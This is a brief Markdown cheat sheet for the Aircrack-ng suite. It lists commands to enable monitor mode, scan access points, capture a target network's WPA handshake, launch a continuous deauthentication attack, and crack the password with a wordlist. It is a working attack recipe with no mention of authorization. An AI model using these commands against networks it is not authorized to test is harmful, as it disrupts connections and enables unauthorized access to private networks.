# Aircrack suite

## TIP: All commands must be run with sudo

### Usage:

#### 1) Assuming that the Wi-Fi interface is wlan0) (Check with iwconfig if the interface went to monitor mode

    airmon-ng start wlan0 

#### 2) Scans for Access Points' SSIDs and BSSIDs or simply a 48-bit MAC around us

    airodump-ng wlan0mon 

#### 3) NUM represents the channel the target is tuned in. Tune in your target, then wait to capture the handshake, then save it as a .cap file

    airodump-ng wlan0mon -c NUM --bssid TARGET_BSSID -w pwd 
    
#### 4) Perform a deauthentication attack against the target

    aireplay-ng --deauth 0 -a TARGET_BSSID wlan0mon 
    
#### 5) Crack the Wi-Fi password

    aircrack-ng HANDSHAKE_FILE.cap -w WORDLIST.txt 
